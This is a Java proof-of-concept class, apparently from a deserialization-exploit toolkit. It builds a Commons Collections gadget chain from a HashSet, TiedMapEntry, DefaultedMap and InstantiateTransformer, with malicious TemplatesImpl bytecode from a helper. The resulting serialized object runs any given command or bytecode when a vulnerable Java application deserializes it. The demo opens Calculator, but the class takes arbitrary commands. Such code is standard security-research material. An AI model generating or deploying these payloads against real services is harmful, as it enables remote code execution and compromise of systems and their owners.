package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
    by @matthias_kaiser
*/
public class MCC6 implements POC{

    public Object getPocObject(Object poc) throws Exception{
        HashMap innermap = new HashMap();
        InstantiateTransformer exp =  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{poc});

        DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,exp);

        TiedMapEntry tiedmap = new TiedMapEntry(map, TrAXFilter.class);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);

        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);

        return hashset;
    }


    @Override
    public Object getPocObject(byte[] bytes) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(bytes));
    }


    @Override
    public Object getPocObject(String cmd) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(cmd));
    }


    public static void main(String[] args) throws Exception {
        String cmd= "open /System/Applications/Calculator.app";
        Object poc = new MCC6().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }
}
